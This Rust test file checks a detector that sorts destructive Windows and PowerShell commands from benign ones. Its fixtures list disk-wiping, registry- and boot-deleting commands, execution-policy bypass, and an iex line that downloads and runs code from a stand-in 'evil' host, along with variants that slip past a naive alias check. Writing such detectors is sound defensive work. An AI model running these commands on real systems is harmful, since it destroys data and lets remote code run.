use super::is_destructive_windows_segment;

#[test]
fn flags_powershell_recursive_force_remove() {
    assert!(is_destructive_windows_segment(
        "Remove-Item -Recurse -Force C:\\Users\\foo"
    ));
    assert!(is_destructive_windows_segment(
        "remove-item -force -recurse C:\\data"
    ));
}

#[test]
fn flags_remove_item_literalpath() {
    assert!(is_destructive_windows_segment(
        "Remove-Item -LiteralPath C:\\Temp\\file.txt -Force"
    ));
    assert!(is_destructive_windows_segment(
        "remove-item -literalpath 'C:\\Foo' -Recurse"
    ));
}

#[test]
fn flags_ri_alias_recurse_force() {
    assert!(is_destructive_windows_segment("ri -Recurse -Force C:\\Tmp"));
    assert!(is_destructive_windows_segment("ri -Force -Recurse C:\\Tmp"));
    assert!(is_destructive_windows_segment("ri -r -Force C:\\x"));
    assert!(is_destructive_windows_segment("ri -Force -r C:\\x"));
}

#[test]
fn flags_rm_alias_recurse_force() {
    assert!(is_destructive_windows_segment("rm -Recurse -Force .git"));
    assert!(is_destructive_windows_segment("rm -Force -Recurse C:\\Log"));
    assert!(is_destructive_windows_segment("rm -r -Force src/"));
    assert!(is_destructive_windows_segment("rm -Force -r src/"));
}

#[test]
fn flags_set_executionpolicy() {
    assert!(is_destructive_windows_segment(
        "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process"
    ));
}

#[test]
fn flags_stop_and_restart_computer() {
    assert!(is_destructive_windows_segment("Stop-Computer"));
    assert!(is_destructive_windows_segment(
        "Restart-Computer -Force -Wait"
    ));
}

#[test]
fn flags_invoke_expression() {
    assert!(is_destructive_windows_segment("Invoke-Expression $payload"));
    assert!(is_destructive_windows_segment(
        "invoke-expression 'Remove-Item C:\\Tmp'"
    ));
    // iex is the built-in PowerShell alias for Invoke-Expression
    assert!(is_destructive_windows_segment(
        "iex (Invoke-WebRequest -Uri 'http://evil/payload').Content"
    ));
    assert!(is_destructive_windows_segment("iex $cmd"));
}

#[test]
fn flags_iex_alias_bypass_shapes() {
    // No-space invocation: `iex("...")`
    assert!(is_destructive_windows_segment(
        "iex(\"Get-Process | Out-File evil.log\")"
    ));
    // Pipeline terminator with no following whitespace: `... | iex`
    assert!(is_destructive_windows_segment(
        "Get-Content payload.ps1 | iex"
    ));
    // No-whitespace pipeline: `...|iex`
    assert!(is_destructive_windows_segment("cat payload.ps1|iex"));
    // Statement-separator prefix: `;iex`
    assert!(is_destructive_windows_segment("$x = 1;iex $payload"));
    // PowerShell call-operator prefix: `&iex`
    assert!(is_destructive_windows_segment("& iex $cmd"));
}

#[test]
fn iex_alias_does_not_match_substring_identifiers() {
    // Identifiers containing the literal `iex` must not trip the alias check.
    assert!(!is_destructive_windows_segment("Get-Hexbin file"));
    assert!(!is_destructive_windows_segment("write-host 'iexample'"));
    assert!(!is_destructive_windows_segment("./find-iex.ps1 search"));
}

#[test]
fn flags_wmic_delete() {
    assert!(is_destructive_windows_segment(
        "wmic process delete where name='notepad.exe'"
    ));
    assert!(is_destructive_windows_segment("wmic product delete"));
}

#[test]
fn flags_clear_content() {
    assert!(is_destructive_windows_segment("Clear-Content C:\\log.txt"));
    assert!(is_destructive_windows_segment(
        "clear-content -path C:\\data\\file.txt"
    ));
}

#[test]
fn flags_recursive_del() {
    assert!(is_destructive_windows_segment("del /S C:\\tmp"));
    assert!(is_destructive_windows_segment("del /Q /F /S C:\\tmp"));
}

#[test]
fn flags_recursive_rd() {
    assert!(is_destructive_windows_segment("rd /S /Q C:\\tmp"));
}

#[test]
fn flags_format_and_diskpart() {
    assert!(is_destructive_windows_segment("format C:"));
    assert!(is_destructive_windows_segment("diskpart"));
}

#[test]
fn flags_reg_delete_and_bcdedit_delete() {
    assert!(is_destructive_windows_segment(
        "reg delete HKLM\\Software\\Foo /f"
    ));
    assert!(is_destructive_windows_segment("bcdedit /delete {default}"));
}

#[test]
fn ignores_benign_commands() {
    assert!(!is_destructive_windows_segment("del foo.txt"));
    // del /q /f without /s only affects named files — not recursive
    assert!(!is_destructive_windows_segment("del /Q /F foo.txt"));
    // del /q /f on a wildcard inside a single directory is still bounded:
    // without /S it does not recurse, so we deliberately leave it benign.
    // Re-promoting it would require a fixture flip here.
    assert!(!is_destructive_windows_segment("del /Q /F somedir\\*"));
    assert!(!is_destructive_windows_segment("dir /S"));
    assert!(!is_destructive_windows_segment("Get-ChildItem -Recurse"));
    assert!(!is_destructive_windows_segment("echo hello"));
    assert!(!is_destructive_windows_segment("cargo build"));
    // ri / rm without recurse+force are benign
    assert!(!is_destructive_windows_segment("ri item.txt"));
    assert!(!is_destructive_windows_segment("rm file.log"));
    // Remove-Item without -Force or -Recurse is not flagged
    assert!(!is_destructive_windows_segment("Remove-Item C:\\Tmp\\file"));
    // -LiteralPath without -Force/-Recurse matches the plain Remove-Item
    // policy: a single named file delete is not destructive.
    assert!(!is_destructive_windows_segment(
        "Remove-Item -LiteralPath C:\\Tmp\\file.txt"
    ));
}

#[test]
fn ignores_benign_forms_of_existing_entries() {
    // vssadmin list/query operations are read-only
    assert!(!is_destructive_windows_segment(
        "vssadmin list shadows /all"
    ));
    // reg query is read-only; only reg delete triggers
    assert!(!is_destructive_windows_segment(
        "reg query HKLM\\Software\\Foo /v Bar"
    ));
    // bcdedit /enum only reads the boot config
    assert!(!is_destructive_windows_segment("bcdedit /enum firmware"));
    // cipher /e encrypts (not the /w wipe-free-space trigger)
    assert!(!is_destructive_windows_segment("cipher /e file.txt"));
    // wmic without "delete" is benign
    assert!(!is_destructive_windows_segment("wmic process list brief"));
}
